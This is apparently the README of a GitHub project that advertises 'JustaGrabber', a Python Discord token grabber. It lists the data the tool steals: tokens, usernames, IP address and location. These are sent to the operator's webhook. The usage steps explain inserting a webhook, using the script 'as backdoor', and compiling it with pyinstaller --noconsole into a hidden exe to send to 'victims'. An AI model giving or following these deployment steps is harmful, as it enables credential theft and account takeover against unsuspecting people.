<p align="center">
<img src="https://img.shields.io/github/languages/top/kldiscord/JustaGrabber?style=flat-square" </a>
<img src="https://img.shields.io/github/last-commit/kldiscord/JustaGrabber?style=flat-square" </a>
<img src="https://img.shields.io/github/stars/kldiscord/JustaGrabber?color=%23daff00&label=Stars&style=flat-square" </a>
<img src="https://img.shields.io/github/forks/kldiscord/JustaGrabber?color=%23daff00&label=Forks&style=flat-square" </a>
</p>


<h1 align="center">🎄 JustaGrabber - A discord token grabber written in python3<h1>
<h3 align="center">🎇 Made by kldiscord https://github.com/kldiscord<h3>
<h3 align="center">😋 I'm updating JustaGrabber!<h3>
<h3 align="center">🌟 Please leave a star if you liked JustaGrabber<h3>

---

#### 💗 New Features v.1.5
 * Token info file
 - JustaGrabber will create temp file, 
 then save token info file in to the temp file.
 - Username, id, email, mfa and more information will be grabbed!
 
#### 🎁 Things will send to you when it grabs someting :
 -  Username, Computer name
 -  Ip, Country, City, Region, Postal, Location with Google Map
 -  Tokens (Discord, Other discord clients, Browsers)
 -  Will be added soon!
 
> 📷 Webhook screenshot

<p align="left"><img src="https://media.discordapp.net/attachments/853578499096707082/934292508635189338/JG.png?width=1044&height=676"</p>

### ❗ About modules
If requests module is not installed in your victim's computer,
JustaGrabber will just exit.
 
### 📁・ How to use
1. Download python 3 at [python.org](https://python.org). Must be 3.x.x
2. Open "JustaGrabber.py" with any code editor.
3. Replace Your webhook in line 15
4. Send the code or use as backdoor. Or convert to exe then give to others

### ⚙・How to compile .py to .exe
First, install pyinstaller using pip in cmd. ( pip install pyinstaller )
And you must have to check to 'Add python x.x.x to path' when you install
Open cmd in the directory that the JustaGrabber.py is in then type : 
```
pyinstaller --onefile --clean --noconsole JustaGrabber.py
```
replace JustaGrabber.py to your file name.
3 folders and 1 file will be created, delete except for the dist folder.
go into the dist folder and there is your exe ready to be sent to victims!

### 💾・ Settings
If you open JustaGrabber.py you will se some settings in line 18,19

|    JustaGrabber Settings 		|
| ------------------------------------ 	|
| `Ping_me` in line 18 : if true, webhook will ping you when grabs tokens (@everyone)	|
| `Blacklist` in line 19 : list of blacklisted players. You can add,remove. But the name is name of pc.|
